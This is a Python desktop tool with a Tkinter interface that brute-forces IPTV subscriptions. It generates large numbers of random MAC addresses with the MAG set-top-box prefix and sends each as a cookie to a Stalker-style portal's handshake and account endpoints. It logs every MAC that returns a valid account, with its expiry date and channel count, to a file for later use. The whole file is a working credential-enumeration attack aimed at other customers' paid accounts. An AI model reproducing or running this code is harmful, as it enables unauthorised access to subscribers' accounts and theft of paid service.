import requests
import json
import random
import threading
import tkinter as tk
from tkinter import scrolledtext
from datetime import datetime
from urllib.parse import urlparse

class MacCheckerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Random Iptv Mac Checker")
        
        self.running = False
        
        # Input for IPTV link
        tk.Label(master, text="Enter IPTV link:").pack()
        self.iptv_link_entry = tk.Entry(master)
        self.iptv_link_entry.pack()

        # Input for number of MACs
        tk.Label(master, text="Number of MAC addresses to generate:").pack()
        self.num_macs_entry = tk.Entry(master)
        self.num_macs_entry.pack()
        self.num_macs_entry.insert(0, "100000")  # Set default value to 100000

        # MAC being tested
        self.mac_label = tk.Label(master, text="Testing MAC address will appear here.")
        self.mac_label.pack(pady=5)

        # Start/Stop button
        self.start_button = tk.Button(master, text="Start", command=self.start_testing)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop", command=self.stop_testing, state=tk.DISABLED)
        self.stop_button.pack()

        # Output area for testing logs
        self.output_text = scrolledtext.ScrolledText(master, width=60, height=20)
        self.output_text.pack()

    def generate_random_mac(self, prefix="00:1A:79:"):
        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"

    def log_output(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)

    def start_testing(self):
        self.running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        iptv_link = self.iptv_link_entry.get()
        try:
            num_macs = int(self.num_macs_entry.get())
            if num_macs <= 0:
                self.log_output("Please enter a positive integer for MAC addresses.")
                self.stop_testing()
                return
        except ValueError:
            self.log_output("Invalid input for number of MAC addresses.")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            return

        parsed_url = urlparse(iptv_link)
        host = parsed_url.hostname
        port = parsed_url.port or 80
        base_url = f"http://{host}:{port}"
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        output_file = f"{host}_{current_time}.txt"

        thread = threading.Thread(target=self.test_macs, args=(base_url, num_macs, output_file))
        thread.start()

    def stop_testing(self):
        self.running = False

    def test_macs(self, base_url, num_macs, output_file):
        for _ in range(num_macs):
            if not self.running:
                break

            mac = self.generate_random_mac()
            self.mac_label.config(text=f"Testing MAC: {mac}")
            #self.log_output(f"Testing MAC address: {mac}")

            try:
                s = requests.Session()
                s.cookies.update({'mac': mac})
                url = f"{base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                res = s.get(url, timeout=10, allow_redirects=False)
                if res.text:
                    data = json.loads(res.text)
                    tok = data['js']['token']

                    url2 = f"{base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {tok}"}
                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                            mac = data['js']['mac']
                            expiry = data['js']['phone']
                            
                            # Fourth request (get all channels)
                            url3 = f"{base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
                            count = 0

                            if res3.status_code == 200:
                                channels_data = json.loads(res3.text)["js"]["data"]
                                count = len(channels_data)

                            if count == 0:
                                result_message = f"There are no channels for MAC: {mac}"
                                self.log_output(result_message)
                            else:
                                result_message = f"MAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n"
                                self.log_output(result_message)

                            # Immediately write the result to the file
                            with open(output_file, "a") as f:
                                f.write(f"{base_url}/c/\n{result_message}\n")
                else:
                    self.log_output(f"No JSON response for MAC {mac}")
            except json.decoder.JSONDecodeError:
                self.log_output(f"JSON decode error for MAC {mac}: No valid JSON response.")
            #except Exception as e:
                #self.log_output(f"Error for MAC {mac}: {e}")
                

        # Enable start button and disable stop button after finishing
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = MacCheckerApp(root)
    root.mainloop()
